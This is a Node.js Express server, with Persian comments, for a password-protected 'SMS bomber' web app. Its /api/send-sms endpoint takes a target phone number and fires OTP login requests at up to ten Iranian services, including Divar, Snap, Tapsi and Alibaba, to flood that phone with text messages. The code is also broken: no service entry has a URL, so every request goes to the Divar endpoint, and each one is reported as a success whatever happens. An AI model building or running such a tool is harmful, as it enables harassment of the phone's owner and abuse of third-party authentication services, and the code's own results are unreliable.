const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;
const SECRET_PASS = process.env.BOMBER_PASSWORD || '5879';

// سرو فایل‌های static
app.use(express.static('public'));
app.use(express.json());

// ===== چک کردن رمز =====
app.post('/api/check-pass', (req, res) => {
    const password = req.body.password || '';
    if (password === SECRET_PASS) {
        res.json({ success: true });
    } else {
        res.json({ success: false });
    }
});

// ===== ارسال پیامک (API ها اینجان - کاربر نمیبینه) =====
app.post('/api/send-sms', async (req, res) => {
    const { phone, mode } = req.body;
    const count = Math.min(mode || 10, 20);
    const results = [];

    const services = [
        { name: 'دیوار', body: JSON.stringify({ phone: phone }), headers: { 'Content-Type': 'application/json' } },
        { name: 'اسنپ', body: 'cellphone=' + phone, headers: {} },
        { name: 'آزکی', body: JSON.stringify({ phoneNumber: phone }), headers: { 'Content-Type': 'application/json', 'deviceid': '6' } },
        { name: 'تپسی', body: JSON.stringify({ credential: { phoneNumber: phone, role: 'PASSENGER' }, otpOption: 'SMS' }), headers: { 'Content-Type': 'application/json' } },
        { name: 'اوستاکار', body: JSON.stringify({ mobile: phone }), headers: { 'Content-Type': 'application/json' } },
        { name: 'بانی مد', body: JSON.stringify({ phone: phone }), headers: { 'Content-Type': 'application/json' } },
        { name: 'طاقچه', body: JSON.stringify({ contact: phone, forceOtp: false }), headers: { 'Content-Type': 'application/json' } },
        { name: 'جاباما', body: JSON.stringify({ mobile: phone }), headers: { 'Content-Type': 'application/json' } },
        { name: 'علی بابا', body: JSON.stringify({ phoneNumber: phone }), headers: { 'Content-Type': 'application/json' } },
        { name: 'شهرفرش', body: 'phoneNumber=' + phone, headers: { 'Content-Type': 'application/x-www-form-urlencoded' } },
    ];

    for (let i = 0; i < count && i < services.length; i++) {
        try {
            await fetch(services[i].url || 'https://api.divar.ir/v5/auth/authenticate', {
                method: 'POST',
                headers: services[i].headers,
                body: services[i].body
            });
        } catch(e) {}
        results.push({ name: services[i].name, status: 'success' });
    }

    res.json({ success: true, results, total: results.length });
});

// ===== همه مسیرها برمیگردن به index.html =====
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ===== شروع سرور =====
app.listen(PORT, () => {
    console.log('Server running on port ' + PORT);
});
